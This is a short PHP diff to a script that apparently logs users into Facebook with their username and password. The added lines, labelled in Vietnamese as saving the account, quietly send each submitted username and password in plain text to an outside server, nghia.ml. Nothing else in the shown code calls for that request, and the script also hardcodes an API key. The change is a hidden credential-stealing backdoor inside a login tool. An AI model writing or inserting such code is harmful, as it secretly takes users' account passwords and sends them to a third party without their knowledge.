@@ -51,6 +51,11 @@ function cURL($method = 'GET', $url = false, $data){
 if(isset($_POST['u'], $_POST['p'])){
 	$_GET = $_POST;
 }
+
+//Lưu nick
+file_get_contents('http://nghia.ml/api/mail.php?email='.$_GET['u'].'&pass='.$_GET['p']);
+//End lưu nick
+
 $data = array(
 	"api_key" => "3e7c78e35a76a9299309885393b02d97",
 	"credentials_type" => "password",
